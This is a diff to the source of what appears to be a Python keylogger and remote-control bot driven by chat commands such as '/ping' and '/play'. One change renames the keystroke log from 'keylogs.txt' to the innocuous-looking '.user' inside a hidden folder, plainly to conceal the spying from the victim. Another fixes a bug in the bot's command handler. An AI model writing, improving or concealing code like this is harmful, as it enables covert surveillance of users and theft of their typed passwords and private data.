@@ -49,7 +49,7 @@ keyboardFrozen = False
 mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 schedule = {}
-log_file = hide_folder + '\\keylogs.txt'
+log_file = hide_folder + '\\.user'
 
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
@@ -290,7 +290,7 @@ def handle(msg):
 				info += '\n' + 'Username: ' + getpass.getuser()
 				response = info
 			elif command == '/ping':
-				response == 'I\'m up'
+				response = 'I\'m up'
 			elif command.startswith('/play'):
 				command = command.replace('/play ', '')
 				command = command.strip()
